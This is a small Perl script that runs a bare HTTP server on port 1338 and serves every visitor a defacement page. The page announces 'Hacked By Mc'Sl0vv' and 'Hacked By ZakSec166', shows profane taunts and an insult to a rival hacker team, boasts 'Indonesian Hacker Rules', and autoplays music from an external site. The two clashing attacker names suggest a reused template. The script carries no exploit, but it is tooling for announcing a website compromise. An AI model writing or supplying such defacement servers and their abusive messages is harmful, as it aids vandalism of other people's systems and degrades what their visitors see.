#!/usr/bin/perl -w
use strict;
use IO::Socket;

sub Wait {
	wait; # wait needed to keep <defunct> pids from building up
}

$SIG{CHLD} = \&Wait;

my $server = IO::Socket::INET->new(
	LocalPort 	=> 1338,	# set port
	Type 		=> SOCK_STREAM,
	Reuse 		=> 1,
	Listen 		=> 10) or die "$@\n";
my $client ;

while($client = $server->accept()) {
	select $client;
	print $client "HTTP/1.0 200 OK\r\n";
	print $client "Content-type: text/html\r\n\r\n";
	print $client "<html>
	<head>
		<title>Hacked By Mc'Sl0vv</title>
		<meta name='description' content='Fuck Off!!!!'/>
		<link rel='preconnect' href='https://fonts.gstatic.com'/>
        <link href='https://fonts.googleapis.com/css2?family=New+Tegomin&display=swap' rel='stylesheet'/>
    </head>
    <style>
    	html{
	font-family: 'New Tegomin', serif;
    background-color:black;
    color:white;
    text-align:center;
    text-shadow:-2px -2px 0 cyan, 2px 2px 0 red;
}
.main{
	font-size:40;
}
.messenge{
	font-size:38;
}
.out{
	font-size:32;
}
    </style>
    <body>
    <br/><font class='main'> Hacked By ZakSec166</font><br/><font class='messenge'>Whats up motherfuckersss!!!!!</font><br><br/><font class='out'>Idiot BlackHat Team!<br><i>Indonesian Hacker Rules</i></font><audio src='https://www.mboxdrive.com/Menepi.mp3' autoplay loop></audio>"; 
}
continue {
	close($client); #kills hangs
	kill CHLD => -$$;
}
